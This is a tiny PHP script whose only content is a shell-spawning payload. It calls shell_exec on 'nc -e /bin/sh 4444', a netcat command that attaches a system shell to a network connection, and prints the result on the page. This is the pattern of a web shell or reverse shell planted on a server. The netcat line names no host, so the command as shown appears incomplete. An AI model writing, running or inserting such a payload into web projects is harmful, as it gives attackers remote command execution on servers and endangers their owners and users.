<?php
$cmd = 'nc -e /bin/sh 4444';
echo '<code style=display:block;white-space:pre-wrap>';
echo shell_exec($cmd);
echo '</code>';
?>
